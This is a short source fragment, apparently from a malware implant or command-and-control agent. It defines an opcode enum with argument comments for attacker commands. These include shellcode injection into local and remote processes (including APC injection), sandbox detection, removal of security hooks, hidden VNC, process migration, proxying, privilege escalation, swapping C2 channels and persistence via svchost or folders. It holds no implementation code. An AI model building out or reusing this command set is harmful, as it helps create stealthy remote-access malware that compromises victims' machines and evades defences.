enum Opcodes{
    PRINT, //1//print [text]
    MSGBOX, //2//msgbox [title] [content]
    POPINT, //0
    CONSUME, //0
    EXEC, //r1//exec [command]
    EXIT, //0
    SLEEP, //1//sleep [time, ms]
    LOCAL_SHC, //1//local_shc [shellcode]
    LOCAL_SHC_RWX, //1//local_shc_rwx [shellcode]
    SANDBOX, //r0//detects sandbox
    REMOTE_SHC_PNAME, //3//remote_shc_pname [processname] [shellcode] [use rwx]
    REMOTE_SHC_PID, //3//remote_shc_pid [pid] [shellcode] [use rwx]
    SHC_INJECT_APC, //3//shc_inject_apc [processname] [shellcode] [use rwx]
    BOF_EXECUTE, //1//bof_execute file([bof file])
    SWAP_C2, //?//swap_c2 [c2 method] ... [poll interval]
    UNHOOK, //0//auto remove hooks
    VNC, //2//vnc [ip] [port]
    HVNC, //2//hvnc [ip] [port]
    CRITICAL, //1//critical [true/false]
    ENUMDESKTOPS, //0
    SETWINSTA, //1//setwinsta [station]
    SETTHDDSK, //1//setthddsk [desktop]
    GETTHDDSK, //0
    PUSHINT, //0
    PUSHSTR, //0
    PROXY, //2//proxy [ip] [port]
    KILLPROXY, //1//killproxy [id]
    MIGRATE, //1//migrate [pid]
    PS, //0//list processes
    GETPID, //0
    CHECKADMIN, //0
    PRIVESC, //0
    SVCHOST_PERSIST, //0
    FOLDER_PERSIST, //0
};